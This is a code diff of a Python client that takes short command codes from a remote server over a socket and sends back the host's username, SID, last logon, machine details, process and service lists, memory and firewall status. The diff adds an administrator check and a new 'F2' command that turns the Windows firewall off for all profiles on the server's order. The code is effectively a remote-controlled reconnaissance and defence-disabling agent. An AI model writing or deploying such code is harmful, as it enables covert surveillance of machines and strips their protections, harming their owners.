@@ -4,6 +4,7 @@ import win32com.client, time
 import platform
 import psutil
 import subprocess
+import ctypes
 strComputer = "."
 objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
 objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
@@ -57,71 +58,87 @@ expandname = os.path.expanduser('~')
 sidstr = win32security.ConvertSidToStringSid(sid)
 #hostname = socket.gethostname()
 #IPAddr = socket.gethostbyname(hostname)
-#test = ["hostname: ", hostname, '\n', "IPADDRESS: ", IPAddr, '\n']
-#data_string = pickle.dumps(test)
+#action = ["hostname: ", hostname, '\n', "IPADDRESS: ", IPAddr, '\n']
+#data_string = pickle.dumps(action)
 #client.send(data_string)
+
+
+def isAdmin():
+    try:
+        is_admin = (os.getuid() == 0)
+        print(os.getuid())
+    except AttributeError:
+       is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    return is_admin
+
+
 while close:
     from_server = client.recv(4096)
-    value = from_server.decode('utf8')
+    value = from_server.decode('utf-8')
     print(value)
     #print(from_server.decode('utf8'))
     if value == 'E':
         client.close()
         close = False
     elif value == "U1":
-        test = ["Username: ", username]
-        data_string = pickle.dumps(test)
+        action = ["Username: ", username]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "U2":
-        test = ["SID: ", sidstr]
-        data_string = pickle.dumps(test)
+        action = ["SID: ", sidstr]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "U4":
-        test = ["Last Logon: ", logon]
-        data_string = pickle.dumps(test)
+        action = ["Last Logon: ", logon]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "O1":
-        test = ["Machine Name: ", socket.gethostname()]
-        data_string = pickle.dumps(test)
+        action = ["Machine Name: ", socket.gethostname()]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "O2":
-        test = ["Machine Version: ", platform.platform()]
-        data_string = pickle.dumps(test)
+        action = ["Machine Version: ", platform.platform()]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "O3":
-        test = ["Machine Type: ", platform.machine()]
-        data_string = pickle.dumps(test)
+        action = ["Machine Type: ", platform.machine()]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "O4":
-        test = ["Processor: ", platform.processor()]
-        data_string = pickle.dumps(test)
+        action = ["Processor: ", platform.processor()]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "C1":
-        test = ["CPU status: ", psutil.cpu_percent(4)]
-        data_string = pickle.dumps(test)
+        action = ["CPU status: ", psutil.cpu_percent(4)]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "C2":
         output = os.popen('wmic process get description, processid').read()
-        test = [output]
-        data_string = pickle.dumps(test)
+        action = [output]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "C3":
-        test = list(psutil.win_service_iter())
-        data_string = pickle.dumps(test)
+        action = list(psutil.win_service_iter())
+        print(action)
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "M1":
-        test = ["Memory Status: ", psutil.virtual_memory()]
-        data_string = pickle.dumps(test)
+        action = ["Memory Status: ", psutil.virtual_memory()]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "M2":
-        test = ["Memory Available: ", psutil.virtual_memory().available]
-        data_string = pickle.dumps(test)
+        action = ["Memory Available: ", psutil.virtual_memory().available]
+        data_string = pickle.dumps(action)
         client.send(data_string)
     elif value == "F1":
-        test = [subprocess.check_call('netsh advfirewall show allprofiles')]
-        data_string = pickle.dumps(test)
-        client.send(data_string)
-
-
-
-
+        action = subprocess.check_output('netsh advfirewall show allprofiles', shell=True)
+        client.send(action)
+    elif value == "F2":
+        if isAdmin():
+            try:
+                action = subprocess.check_call('netsh advfirewall set allprofile state off')
+                client.send(bytes("Disabled","utf8"))
+            except:
+                client.send(bytes("Error Found, not admin","utf8"))
+        else:
+            client.send(bytes("Not admin", "utf8"))
